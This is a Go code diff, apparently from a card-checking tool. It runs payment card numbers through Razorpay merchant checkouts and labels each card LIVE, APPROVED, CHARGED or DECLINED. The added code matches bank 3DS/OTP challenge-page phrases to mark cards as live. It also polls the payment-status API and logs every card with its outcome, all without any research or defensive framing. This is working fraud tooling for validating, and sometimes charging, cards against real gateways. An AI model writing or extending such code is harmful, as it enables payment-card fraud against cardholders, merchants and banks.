@@ -572,8 +572,36 @@ func determineTagFromSolverPage(pageText string) (string, string) {
 	if strings.Contains(lower, "payment") && strings.Contains(lower, "failed") {
 		return "DECLINED", "payment_failed"
 	}
+	// Bank 3DS challenge page indicators — card is LIVE, needs OTP.
+	bank3dsKeywords := []string{
+		"verify your purchase", "transaction verification",
+		"we have sent the secure online code", "we have sent the secure code",
+		"getting your verification method", "enter otp", "enter the otp",
+		"one time password", "one-time password", "secure online",
+		"3d secure", "mastercard securecode", "verified by visa",
+		"verified by mastercard", "please enter the otp",
+		"secure online shopping", "cardholder authentication",
+		"verify your identity", "secure payment system",
+		"payer authentication", "acs challenge",
+	}
+	for _, kw := range bank3dsKeywords {
+		if strings.Contains(lower, kw) {
+			return "LIVE", "3ds_challenge"
+		}
+	}
 	if strings.Contains(lower, "verification needed") || strings.Contains(lower, "keep your account safe") || strings.Contains(lower, "authenticate") {
 		return "LIVE", "3ds_challenge"
+	}
+	// "Payment in progress" — still processing, treat as LIVE (safe default).
+	pipKeywords := []string{
+		"payment in progress", "payment is being processed",
+		"processing your payment", "please wait while we process",
+		"we are processing your payment",
+	}
+	for _, kw := range pipKeywords {
+		if strings.Contains(lower, kw) {
+			return "LIVE", "payment_in_progress"
+		}
 	}
 	if strings.Contains(lower, "error") && strings.Contains(lower, "sorry") && strings.Contains(lower, "issue") {
 		return "DECLINED", "bank_error"
@@ -749,6 +777,59 @@ func processRazorpayPayment(card, cc, mm, yy, cvv string, md *razorpayMerchantDa
 	if solverResult != nil && solverResult.Charged {
 		fmt.Printf("[RAZ] card=%s step=3ds_result CHARGED (frictionless)\n", card)
 		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
+	}
+
+	// Bank 3DS challenge page detected (issuer ACS page loaded — OTP/Verify
+	// page). This means the card is LIVE and passed all checks; it just
+	// requires OTP. Treat as APPROVED immediately. Don't call cancel — we
+	// already know the card is good.
+	if solverResult != nil && solverResult.Bank3DS {
+		fmt.Printf("[RAZ] card=%s step=3ds_result BANK_3DS (challenge page detected → APPROVED)\n", card)
+		return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
+	}
+
+	// "Payment in progress" page — Razorpay's frictionless status polling
+	// page. The bank is doing backend 3DS; the result isn't visible in the
+	// browser. Retry the status API a few times with delays — the payment
+	// may transition to captured once the bank finishes.
+	if solverResult != nil && solverResult.PaymentInProgress {
+		fmt.Printf("[RAZ] card=%s step=3ds_result PAYMENT_IN_PROGRESS (retrying status API)\n", card)
+		for attempt := 1; attempt <= 4; attempt++ {
+			time.Sleep(3 * time.Second)
+			status, statusData := checkPaymentStatus(client, md, sessionToken, paymentID)
+			fmt.Printf("[RAZ] card=%s step=pip_retry attempt=%d status=%s\n", card, attempt, status)
+			if status == "captured" || status == "authorized" {
+				fmt.Printf("[RAZ] card=%s step=pip_retry CHARGED (status=%s)\n", card, status)
+				return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
+			}
+			if status == "failed" {
+				errDesc := ""
+				if errObj, ok := statusData["error"].(map[string]interface{}); ok {
+					if d, ok := errObj["description"].(string); ok {
+						errDesc = d
+					}
+				}
+				if errDesc == "" {
+					if d, ok := statusData["error_description"].(string); ok {
+						errDesc = d
+					}
+				}
+				if errDesc == "" {
+					errDesc = "Payment failed"
+				}
+				reasonStr := "payment_failed"
+				if r, ok := statusData["reason"].(string); ok && r != "" {
+					reasonStr = r
+				}
+				fmt.Printf("[RAZ] card=%s step=pip_retry DECLINED (desc=%s)\n", card, errDesc)
+				return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > " + strings.ToUpper(reasonStr), Gateway: razorpayGatewayName}
+			}
+			// status is "pending"/"created"/"attempted" — keep retrying
+		}
+		// Still in progress after 4 retries. Fall through to cancel to
+		// classify it. The cancel will likely return payment_cancelled →
+		// LIVE, which is the safe answer for a card still being processed.
+		fmt.Printf("[RAZ] card=%s step=pip_retry still pending after 4 attempts, falling through to cancel\n", card)
 	}
 
 	// Step 2: Check payment status. For frictionless cards, the 3DS auth
